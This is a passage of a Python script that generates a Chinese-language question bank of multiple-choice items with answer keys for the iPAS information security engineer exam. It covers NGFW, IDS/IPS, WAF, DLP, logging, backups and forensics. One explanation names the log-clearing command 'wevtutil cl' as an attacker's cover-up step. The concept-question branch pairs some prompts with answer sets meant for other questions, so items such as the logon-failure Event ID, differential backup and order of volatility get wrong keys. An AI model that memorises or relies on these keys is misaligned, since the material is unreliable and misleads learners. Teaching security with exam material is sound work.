                ("A. 使相同密碼的使用者產生截然不同的雜湊值，徹底瓦解預先計算之彩虹表攻擊", "B. 加快密碼雜湊運算速度以降低 CPU 負擔", "C. 讓密碼可以在遺忘時輕鬆還原明文", "D. 減少資料庫儲存空間", "A",
                 "加鹽（Salt）為每位使用者附加一串隨機亂數再計算 Hash，使預先算好的彩虹表完全失效，攻擊者必須針對每筆帳號個別暴力破解。",
                 "Salt 並非密鑰，可以直接明文存放在資料庫中。", "OWASP 密碼儲存安全備忘錄"),
                ("A. 即使日後伺服器長效私鑰遭洩漏，攻擊者亦無法解密過往已攔截儲存的歷史加密連線內容", "B. 能讓傳輸速度提升 100 倍", "C. 能夠防止受害者遭遇釣魚網站欺騙", "D. 能夠完全取代防火牆", "A",
                 "前向保密（PFS）在每次工作階段中動態生成一次性臨時金鑰（如 DHE/ECDHE），長效私鑰僅用於身分驗證，私鑰洩漏無法回溯推導工作階段金鑰。",
                 "非常關鍵的現代加密標準考點。", "RFC 8446 TLS 1.3 核心要求"),
                ("A. 定期執行金鑰輪替（Key Rotation），生成新金鑰並汰換老舊金鑰", "B. 只要沒被偷就可以永久使用無需變更", "C. 將金鑰直接張貼於內部公告欄以利備份", "D. 降低金鑰長度至 56-bit", "A",
                 "金鑰有其安全生命週期（Cryptoperiod），長期不更換會增加金鑰洩漏與密文累積遭分析破解之風險，必須依規定期輪替（Rotation）。",
                 "金鑰管理必須包含生成、使用、存儲、輪替、撤銷到銷毀的全生命週期控管。", "NIST SP 800-57 金鑰管理指引"),
                ("A. 所持（Something you have）", "B. 所知（Something you know）", "C. 所具（Something you are）", "D. 所處（Somewhere you are）", "A",
                 "實體硬體金鑰（如 YubiKey、智慧卡、USB Token）屬於使用者持有的實體載具，歸類為『所持』因子。",
                 "若金鑰本身附帶指紋辨識，則結合了所持與所具雙因子。", "NIST SP 800-63B")
            ]
            opt_A, opt_B, opt_C, opt_D, ans, expl, trap, law = opts_map[sub_topic_idx]
            opts = [opt_A, opt_B, opt_C, opt_D]

        elif domain_id == 7:
            # B-DOM-7: 網路防護設備、次世代防火牆與 IDS/IPS
            topics = [
                ("次世代防火牆 (NGFW) vs 傳統防火牆", "L3/L4 狀態檢驗 vs L7 深度封包檢驗 (DPI) 與 App-ID"),
                ("入侵偵測系統 (IDS) 原理與部署", "Port Mirroring 旁路監聽、特徵比對與告警延遲"),
                ("入侵防禦系統 (IPS) 原理與部署", "Inline 串聯部署、即時阻斷 (Dropping) 與旁路故障 (Bypass)"),
                ("網站應用程式防火牆 (WAF) 應用", "專防 OWASP Top 10 Web 攻擊與反向代理部署"),
                ("網路存取控制 (NAC / 802.1X)", "端點健康度檢查與未合規設備動態隔離隔離區"),
                ("正向代理 (Forward Proxy) vs 反向代理 (Reverse Proxy)", "員工上網安全過濾 vs 內部 Web 負載平衡與防護"),
                ("分散式阻斷服務 (DDoS) 防禦技術", "流量清洗中心 (Scrubbing Center)、CDN 快取與 Anycast BGP"),
                ("次世代防毒 (NGAV) 與特徵碼限制", "未知惡意程式 (Zero-day) 偵測與行為啟發式分析"),
                ("蜜罐與誘捕技術 (Honeypot)", "低誤報率、誘敵深入與收集最新零日情資"),
                ("資料外洩防護 (DLP) 網路邊界應用", "深度內容識別 (正則比對信用卡/身分證) 與外傳阻斷")
            ]
            t_name, t_core = topics[sub_topic_idx]
            if is_scenario:
                case_prompts = [
                    f"{org}內部網路頻繁遭受駭客將惡意命令隱藏於標準 HTTPS（Port 443）流量中外傳機密。傳統 Layer 4 狀態檢查防火牆因 Port 443 開放而全數放行。企業最應導入何種邊界設備以落實第 7 層應用程式內容與 SSL 解密檢驗？",
                    f"{org}規劃於核心交換機旁部署一套入侵偵測系統（IDS），網管人員使用交換機的連接埠鏡像（Port Mirroring / SPAN）將流量複製一份送入 IDS。此種部署方式的致命限制為何？",
                    f"{org}為防止外部勒索軟體的漏洞利用攻擊封包進入內部伺服器，資安主管要求資安設備必須具備「在攻擊封包到達受害伺服器前，立即予以主動丟棄阻斷（Drop Packet）」之能力。該設備必須採何種架構部署？",
                    f"{org}對外提供之線上購物網站近期頻繁遭受 SQL 注入與跨網站腳本（XSS）攻擊。若要在不改動應用程式原始碼之前提下迅速在網路邊界建立防護，應優先在 Web 伺服器前端部署：",
                    f"{org}為防範外來訪客或外包廠商未經核准之個人筆電隨意插入辦公室實體網路孔存取內網，企業應在區域網路交換器上導入何種網路存取控制標準？",
                    f"{org}規劃於內部網路邊界部署代理伺服器（Proxy），用以統一管制全公司同仁上網行為、過濾惡意釣魚網址並快取網頁以節省外網頻寬。此種代理伺服器型態屬於：",
                    f"{org}在舉辦週年慶促銷活動期間，官方電商網站突遭超過 300 Gbps 的巨量反射放大攻擊（DNS/NTP Amplification DDoS）導致對外頻寬瞬間塞爆癱瘓。此時內部自建防火牆已完全無法承受，最適當之應變處置為：",
                    f"{org}傳統防毒軟體每日更新病毒特徵碼，但某日仍遭到全新變種勒索軟體穿透。資安顧問指出傳統防毒軟體難以防禦零日攻擊（Zero-day），建議導入結合機器學習與行為啟發之何種技術？",
                    f"{org}在內部伺服器網段中部署了一台刻意未打補丁且偽裝成核心資料庫的「蜜罐伺服器（Honeypot）」。若監控系統突然收到該蜜罐伺服器被內部某台 PC 連線之警報，資安分析師應如何判定該警報？",
                    f"{org}為落實客戶個人資料外流防護，在電子郵件閘道端啟用了資料外洩防護（DLP）規則。當員工企圖透過郵件將含有身分證字號清單之 Excel 寄給私人信箱時，DLP 主要透過何種技術識別出機敏資料？"
                ]
                q_text = case_prompts[sub_topic_idx]
            else:
                concept_prompts = [
                    "相較於傳統網路層狀態檢驗防火牆（Stateful Inspection Firewall），次世代防火牆（NGFW）最核心之技術優勢在於：",
                    "入侵偵測系統（IDS）與入侵防禦系統（IPS）最根本之運作架構差異為何？",
                    "在網路安全架構中，IPS 通常採用何種方式部署於網路鏈路上，以便能夠即時檢查並阻斷流經之惡意封包？",
                    "網站應用程式防火牆（WAF）主要運作於 OSI 模型的哪一層，專門用於解析與防護 Web 應用威脅？",
                    "IEEE 802.1X 協定在企業端點安全架構中主要扮演何種角色？",
                    "關於「反向代理伺服器（Reverse Proxy）」之定位與功能，下列敘述何者正確？",
                    "面對超過企業出口總頻寬容量之大規模體積型（Volumetric）DDoS 洪水攻擊，最有效的防禦策略通常為：",
                    "端點防護中，次世代防毒（NGAV）與端點偵測回應（EDR）主要擺脫了對下列何者的單一依賴？",
                    "資安領域中所稱之「蜜罐（Honeypot）」技術，其核心設計哲學與警報特性為何？",
                    "資料外洩防護（DLP, Data Loss Prevention）系統在進行網路外傳內容檢測時，最常使用何種技術來精準識別信用卡號或身分證字號？"
                ]
                q_text = concept_prompts[sub_topic_idx]

            opts_map = [
                ("A. 次世代防火牆（NGFW，具備 Layer 7 深度封包檢測 DPI 與 SSL/TLS 解密能力）", "B. 集線器（Hub）", "C. 傳統 Layer 3 靜態封包過濾路由器", "D. 無線基地台（AP）", "A",
                 "NGFW 具備第 7 層深度封包檢驗與 SSL 解密檢驗能力，即使在 443 連接埠中亦能識別具體應用程式與隱蔽惡意負載。",
                 "傳統防火牆僅檢查 Port 443 放行，無法察覺加密封包內的惡意內容。", "Gartner NGFW 定義標準"),
                ("A. 採旁路監控（Out-of-band）只能被動發出告警，無法在封包到達目標前即時攔截阻斷", "B. 伺服器會立即斷線崩潰", "C. 會導致交換機網路速度降低 99%", "D. 無法分析任何網路封包", "A",
                 "IDS 透過 Mirror Port 接收複製流量，封包此時早已送達目的地，因此 IDS 只能事後告警，完全無法即時阻斷連線。",
                 "需要即時阻斷者必須採用 Inline 串聯部署之 IPS。", "NIST SP 800-94"),
                ("A. 採用 Inline（串聯）方式部署於網路通訊核心路徑上之 IPS", "B. 採用旁路監聽方式部署之網路分析儀", "C. 關閉所有網路交換機", "D. 僅使用本機記事本記錄", "A",
                 "IPS 必須以 Inline（串聯）方式像守門員一樣跨接在線路上，所有封包流經 IPS 本體檢驗，確認惡意立即執行 Drop 阻斷。",
                 "串聯部署若設備故障需具備 Hardware Bypass 機制以確保網路不斷線。", "NIST SP 800-94"),
                ("A. 網站應用程式防火牆（WAF, Web Application Firewall）", "B. 傳統 Layer 3 網路防火牆", "C. 本機防毒軟體", "D. 磁帶備份機", "A",
                 "WAF 專為 HTTP/HTTPS 打造，能深入剖析 URL、Header、Cookie 與 POST Body，阻絕 SQLi、XSS、WebShell 等 Web 應用漏洞。",
                 "一般網路防火牆無法理解 HTTP 語意與 SQL 注入語法。", "PCI DSS 要求 6.6"),
                ("A. 802.1X 網路接取控制（NAC, Network Access Control）", "B. 停用所有交換器電源", "C. 允許所有人免認證使用", "D. 改用家用集線器", "A",
                 "802.1X 搭配 RADIUS 伺服器，可在端點網線插上交換器時強制進行身分認證與健康度檢查，未通過者直接劃入隔離 VLAN。",
                 "能有效防止外來未授權設備私接內網（Rogue Device）。", "IEEE 802.1X 標準"),
                ("A. 正向代理（Forward Proxy，代理內部用戶端向外網伺服器發起存取）", "B. 反向代理（Reverse Proxy）", "C. 蜜罐系統", "D. 入侵防禦系統", "A",
                 "Forward Proxy 位於用戶端前端，代表用戶端向外部網站請求，具備集中上網稽核、網址過濾與快取功能；Reverse Proxy 則是為後端伺服器擋在前端。",
                 "口訣：保護內部訪客向外上網是正向代理；保護後台伺服器對外提供服務是反向代理。", "RFC 7230"),
                ("A. 立即將對外 DNS 解析切換至雲端抗 DDoS 流量清洗服務（Scrubbing Center）或 CDN", "B. 重啟內部路由器", "C. 在內部防火牆手動逐筆封鎖 IP", "D. 將伺服器網線拔除", "A",
                 "當流量超過實體線路頻寬（Pipe Saturation）時，在地端做任何阻擋皆無效（水管已被塞滿），必須由雲端流量清洗中心在大骨幹網將惡意流量清洗過濾後再回傳乾淨流量。",
                 "單純在本地端防火牆封鎖 IP 無法解決頻寬被塞爆的問題。", "CISA DDoS 緩解指南"),
                ("A. 次世代防毒（NGAV）與端點行為監控（EDR）", "B. 增加硬碟儲存容量", "C. 停用 Windows 內建防火牆", "D. 移除所有防毒軟體", "A",
                 "傳統特徵碼防毒對未知的 Zero-day 無法比對出 Hash；NGAV 透過機器學習與行為啟發式分析（如偵測注入、提權、異常連線）可防範未知威脅。",
                 "擺脫對靜態特徵庫的絕對依賴是端點安全的重大演進。", "Gartner 端點防護平台報告"),
                ("A. 該警報具有極高真實性與威脅性，代表內部已有受害或具惡意意圖之主機正在進行內網橫向刺探", "B. 判定為系統誤報，直接忽略", "C. 代表蜜罐軟體損壞", "D. 代表網路速度過慢", "A",
                 "蜜罐在正常業務中絕不應有任何人連線存取，任何對蜜罐的觸發皆屬於高度可疑的黑客探測或內部橫向移動行為，誤報率極低。",
                 "蜜罐警報優先級通常設定為極高，需立即介入排查發起端。", "SANS 誘捕防禦指南"),
                ("A. 關鍵字規則與正規表達式（Regular Expression, RegEx）內容識別技術", "B. 僅檢查電子郵件主旨長度", "C. 檢查寄件時間是否在下班時間", "D. 僅壓縮電子郵件大小", "A",
                 "DLP 透過深層內容剖析（DPI）搭配正規表達式（比對身分證格式、信用卡 Luhn 演算法校驗碼）與資料特徵指紋（Fingerprinting），精準識別機敏文件。",
                 "單純看副檔名無法防範員工將機敏資料複製到純文字檔外傳。", "ISO/IEC 27001 A.8.12 DLP 控制")
            ]
            opt_A, opt_B, opt_C, opt_D, ans, expl, trap, law = opts_map[sub_topic_idx]
            opts = [opt_A, opt_B, opt_C, opt_D]

        else:
            # B-DOM-8: 監控日誌、弱點掃描、備份與實體安全
            topics = [
                ("Syslog 集中收集與日誌保存期限", "法規要求至少留存 180 天、WORM 唯讀機制"),
                ("Windows 安全事件識別碼 (Event ID)", "4624 (登入成功)、4625 (登入失敗)、1102 (日誌清除)"),
                ("網路時間協定 (NTP) 校時重要性", "全網毫秒級同步與事件鑑識關聯分析依據"),
                ("弱點掃描 (VA) 原理與憑證掃描", "未認證掃描 vs 認證掃描之精準度差異"),
                ("3-2-1 備份架構落地實務", "3份資料/2種媒介/1份異地與離線隔離 (Air-gap)"),
                ("完整備份 vs 差異備份 vs 增量備份", "備份耗時/空間佔用 vs 災難還原所需步驟與時間"),
                ("實體環境安全與雙重門禁 (Mantrap)", "防尾隨設計、CCTV 監控與實體區域分級"),
                ("機房電力與環控滅火安全", "雙迴路 UPS、溫濕度控制與 FM-200 / 氣體滅火"),
                ("儲存媒體報廢與資料抹除 (NIST SP 800-88)", "邏輯清除 (Clear)、磁氣消磁 (Purge) 與實體破碎 (Destroy)"),
                ("資安事件初期證據保全", "嚴禁任意重開機、保全記憶體 (RAM) 與計算 Hash")
            ]
            t_name, t_core = topics[sub_topic_idx]
            if is_scenario:
                case_prompts = [
                    f"{org}接受主管機關資安稽核，查核委員要求檢視核心伺服器過去半年的系統存取日誌。依據我國《資通安全管理法》相關辦法之法規要求，公務與關鍵機關之各項資通安全稽核軌跡日誌，法定最低保存期限為多久？",
                    f"{org}監控人員在審查 Windows 網域伺服器日誌時，發現出現了一筆 Event ID 為 `1102` 的稽核事件。此事件在 Windows 安全日誌中代表何種含意？",
                    f"{org}內部多台伺服器未設定 NTP 校時，導致事件發生時各設備日誌時間偏差高達數十分鐘至數小時，鑑識人員完全無法依時序關聯還原黑客入侵路徑。為根治此問題，IT 團隊應採取何種配置？",
                    f"{org}資安團隊使用漏洞掃描工具進行內部資產盤點，若欲深入掌握每台伺服器內部已安裝套件的具體版本、缺少之 Windows 補丁以及內部註冊表不當組態，應採用何種掃描方式？",
                    f"{org}為防止勒索軟體在加密本地端檔案後，順著網路連線將掛載的 NAS 備份檔一併全數銷毀，在備份架構上最應嚴格落實下列何項原則？",
                    f"{org}每週日凌晨執行一次「完整備份（Full Backup）」，週一至週六每晚執行「增量備份（Incremental Backup）」。若該系統於週四下午不幸硬碟毀損，還原時需要依序載入哪些備份檔案？",
                    f"{org}核心資料中心機房為防止未經授權人員尾隨合法員工潛入（Tailgating / Piggybacking），在實體出入口設計上應優先採用何種門禁管制設施？",
                    f"{org}新建置之主要伺服器機房，為防止火災發生時水柱灑水破壞高單價之伺服器主機與儲存設備，機房自動滅火系統應選用何種類型？",
                    f"{org}批次淘汰一批儲存過大量客戶機敏身分證影本的老舊 SAS 硬碟，依據 NIST SP 800-88 媒體消磁與銷毀標準，若欲達到「不可復原（Purge）」之最高防護水準，應採取何種處理方式？",
                    f"{org}資安小組發現某台線上交易伺服器正連線至不明惡意 IP 且記憶體中有異常進程運作，小組成員正準備進行數位證據採集。下列何項操作會嚴重破壞數位證據之完整性，應絕對嚴格禁止？"
                ]
                q_text = case_prompts[sub_topic_idx]
            else:
                concept_prompts = [
                    "依據我國資通安全管理法規，關鍵資訊系統與資通設備之日誌紀錄（Log），法定最低應保存之期限為：",
                    "在 Windows 安全事件日誌中，用以表示「使用者登入失敗（Logon Failure）」之標準 Event ID 為何？",
                    "在網路維運與資安監控中，部署「網路時間協定（NTP）」確保全網設備時間同步之最主要資安價值在於：",
                    "在弱點掃描（Vulnerability Assessment）中，相較於「無憑證掃描」，「具憑證掃描（Credentialed Scan）」之主要優勢為何？",
                    "經典的「3-2-1 備份原則」具體要求為何？",
                    "關於「差異備份（Differential Backup）」之定義，下列敘述何者正確？",
                    "在實體安全控制中，用以防止人員尾隨（Tailgating）進入高機敏區域的雙重連鎖門（Mantrap）機制，其運作原理為何？",
                    "在現代高科技資料中心機房中，最常見且不易破壞電子電氣設備之潔淨氣體自動滅火藥劑為：",
                    "依據 NIST SP 800-88 媒體清除指南，「淨化（Purge）」層級之消磁（Degaussing）處理，其核心目標為何？",
                    "依據數位鑑識（Digital Forensics）之「揮發性順序（Order of Volatility）」原則，當調查受駭主機時，下列何種數位資料最易遺失，必須第一優先採集？"
                ]
                q_text = concept_prompts[sub_topic_idx]

            opts_map = [
                ("A. 至少保存 180 天（約半年）以上", "B. 至少保存 30 天", "C. 至少保存 7 天", "D. 只要硬碟有空間才保存，無強制期限", "A",
                 "依據我國資通安全責任等級分級辦法規定，公務機關與特定非公務機關之日誌紀錄至少必須留存 180 天。",
                 "考題常以 30 天或 90 天作為干擾項，法定標準為 180 天。", "《資通安全責任等級分級辦法》附表"),
                ("A. 安全審核日誌遭到手動或指令清除（The audit log was cleared）", "B. 系統成功重啟", "C. 防毒軟體更新成功", "D. 建立了新的使用者帳號", "A",
                 "Event ID 1102 代表安全日誌遭手動清除（如執行 wevtutil cl），在資安分析中被列為極度危險之滅證行為指標。",
                 "攻擊者入侵後為掩飾行蹤常清除日誌，會觸發 1102。", "微軟 Windows 安全日誌指南"),
                ("A. 全網伺服器與網路設備強制同步至標準可信之 NTP（網路時間協定）時間伺服器", "B. 允許每台伺服器手動由管理員隨意調整時間", "C. 關閉所有日誌之時間標籤", "D. 每天由人工打卡確認", "A",
                 "NTP 校時能保證所有端點、防火牆、伺服器之 Log 時間戳記毫秒不差，是進行事後威脅關聯分析與法律證據舉證的必備基石。",
                 "時間若混亂，多設備間的關聯分析（SIEM Correlation）將完全失效。", "RFC 5905 NTPv4"),
                ("A. 認證弱點掃描（Credentialed / Authenticated Scan）", "B. 無憑證黑箱掃描", "C. 單純 Ping 掃描", "D. 網域名稱查詢", "A",
                 "具憑證掃描使用主機合法帳號登入系統，能深入查詢本機軟體清單、登錄檔及內部安全組態，大幅降低誤報與漏報率。",
                 "外部無憑證掃描只能看到開放的 Port 與橫幅（Banner），無法深入主機內部檢驗補丁。", "NIST SP 800-115 測試指南"),
                ("A. 3-2-1 備份原則，且必須包含一份完全離線或不可竄改的實體隔離（Air-gap）複本", "B. 僅備份至本機 C 槽桌面", "C. 將備份檔透過匿名 FTP 上傳", "D. 完全不做備份，僅靠防毒軟體", "A",
                 "現代勒索軟體會主動搜索並格式化內網所有在線備份 NAS，唯有透過 3-2-1 離線磁帶或不可變儲存（WORM），才能確保有安全乾淨的資料可還原。",
                 "防勒索的核心是『離線隔離備份』。", "CISA 勒索軟體防範指引"),
                ("A. 週日的完整備份 ＋ 週一、週二、週三之三次增量備份（需依序還原）", "B. 僅需要週三的增量備份", "C. 僅需要週日的完整備份", "D. 需要過去一個月內的所有備份", "A",
                 "增量備份只記錄自上次任意備份後之異動。還原時必須先載入最後一次完整備份，再按日期順序逐一載入所有增量備份。",
                 "增量備份優點為備份快速節省空間，缺點為還原步驟多且任一增量損毀即無法完全還原。", "儲存與備份架構手冊"),
                ("A. 雙重認證防尾隨旋轉門（Mantrap / Air-lock，一次只容許一人進入）", "B. 一般木質喇叭鎖門", "C. 僅張貼「請勿尾隨」之警語告示牌", "D. 長期開啟大門保持通風", "A",
                 "Mantrap 由兩道互鎖門組成，第一道門關閉並鎖定後，第二道門才可開啟驗證進入，能物理性完全杜絕尾隨潛入。",
                 "實體安全必須仰賴物理互鎖結構而非僅靠自律宣導。", "ISO/IEC 27001 A.7 實體安全"),
                ("A. 乾淨氣體自動滅火系統（如 FM-200, Novec 1230 或惰性氣體 IG-541）", "B. 傳統高壓水柱灑水系統", "C. 泡沫滅火系統", "D. 乾粉滅火器手動噴灑", "A",
                 "FM-200 等潔淨氣體透過化學抑燃吸熱滅火，滅火後揮發不留殘渣、不導電、不破壞精密電器設備，為機房標準配備。",
                 "水灑水會導致伺服器短路直接報廢；乾粉具腐蝕性會侵蝕電子電路。", "NFPA 2001 潔淨氣體滅火規範"),
                ("A. 使用具備足夠高斯強度之專業消磁機（Degausser）徹底破壞磁軌結構，並送入實體破碎機物理粉碎", "B. 僅在 Windows 中執行「右鍵格式化」", "C. 直接丟入一般垃圾桶", "D. 撕除硬碟標籤即可", "A",
                 "高敏感硬碟淘汰必須先經過專業消磁（Degaussing 使磁性粒子混亂徹底抹除），再送入物理破碎機碾碎成微小鐵屑，並出具銷毀證明與錄影留存。",
                 "單純快速格式化完全無法阻止專業資料救援軟體提取原始機敏資料。", "NIST SP 800-88 Rev.1"),
                ("A. 直接手動按下電源按鈕將伺服器強制重啟或斷電關機", "B. 將網路線拔除防止惡意連線向外傳輸", "C. 使用防寫裝置（Write Blocker）採集硬碟映像", "D. 計算原始硬碟之 SHA-256 雜湊值記錄於保管鏈文件", "A",
                 "依據揮發性順序，RAM（隨機存取記憶體）一旦斷電或重開機，暫存的關鍵惡意進程代碼、解密金鑰與網路連線紀錄將永久煙滅消失。",
                 "現場採證大忌：隨意關機或重新開機！應維持通電狀態先進行記憶體導出（Memory Dump）。", "RFC 3227 數位證據採集指南")
            ]
            opt_A, opt_B, opt_C, opt_D, ans, expl, trap, law = opts_map[sub_topic_idx]
            opts = [opt_A, opt_B, opt_C, opt_D]

        # 隨機打亂選項順序以增加多樣性（記錄對應正確答案）
        indexed_opts = list(enumerate(opts))
        # 保持答案正確映射
        correct_orig_idx = ord(ans) - ord('A')
        # 決定是否打亂選項以確保答案分佈均勻
        random.shuffle(indexed_opts)
        
        new_opts = []
        new_ans = 'A'
        for new_idx, (orig_idx, opt_str) in enumerate(indexed_opts):
            # 去除原本前面的 "A. " 或 "B. "
            content_clean = opt_str[3:].strip() if opt_str[1:3] in ['. ', '、'] else opt_str
            letter = chr(ord('A') + new_idx)
            new_opts.append(f"{letter}. {content_clean}")
            if orig_idx == correct_orig_idx:
                new_ans = letter

        # 提取英文關鍵字與發音標籤
        full_text = q_text + " " + " ".join(new_opts) + " " + expl
        terms = extract_terms(full_text)

        q_obj = {
            "id": qid,
            "level": "初級",
            "subject": subject_name,
            "domain": domain_name,
            "scenario": is_scenario,
            "question": q_text,
            "options": new_opts,
            "answer": new_ans,
            "terms": terms,
            "explanation": expl,
            "trap": trap,
            "law": law
        }
        questions.append(q_obj)
        
    return questions

def main():
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    assets_dir = os.path.join(base_dir, "assets")
    os.makedirs(assets_dir, exist_ok=True)

    domains = [
        # 考科一：資訊安全概論 (400 題)
        (1, "資安核心原則、法規與隱私基礎", "考科一：資訊安全概論", 1),
        (2, "網路通訊協定與架構安全", "考科一：資訊安全概論", 101),
        (3, "作業系統與主機端點安全", "考科一：資訊安全概論", 201),
        (4, "惡意程式分析與常見威脅情境", "考科一：資訊安全概論", 301),
        
        # 考科二：資訊安全防護實務 (400 題)
        (5, "應用系統安全與 OWASP Top 10", "考科二：資訊安全防護實務", 401),
        (6, "密碼學基礎、金鑰管理與身分認證", "考科二：資訊安全防護實務", 501),
        (7, "網路防護設備、次世代防火牆與 IDS/IPS", "考科二：資訊安全防護實務", 601),
        (8, "監控日誌、弱點掃描、備份與實體安全", "考科二：資訊安全防護實務", 701),
    ]

    all_questions = []
    for d_id, d_name, sub_name, start_idx in domains:
        print(f"Generating Domain {d_id}: {d_name} (100 questions)...")
        qs = generate_domain_questions(d_id, d_name, sub_name, start_idx, count=100)
        all_questions.extend(qs)

    print(f"Total Basic Questions generated: {len(all_questions)}")
    assert len(all_questions) == 800, f"Expected 800 questions, got {len(all_questions)}"

    # 驗證 scenario 比例 >= 90%
    scenario_count = sum(1 for q in all_questions if q["scenario"])
    scenario_pct = (scenario_count / len(all_questions)) * 100
    print(f"Scenario questions count: {scenario_count} ({scenario_pct:.1f}%)")
    assert scenario_pct >= 90.0, f"Scenario percentage {scenario_pct}% is below 90%"

    # 寫入 JS 檔案
    output_js = os.path.join(assets_dir, "questions-basic.js")
    with open(output_js, "w", encoding="utf-8") as f:
        f.write("// iPAS 資訊安全工程師 - 初級 800 題完整情境解析題庫\n")
        f.write("window.IPAS_QUESTIONS_BASIC = ")
        json.dump(all_questions, f, ensure_ascii=False, indent=2)
        f.write(";\n")

    print(f"Successfully saved 800 Basic questions to {output_js}")

if __name__ == "__main__":
    main()
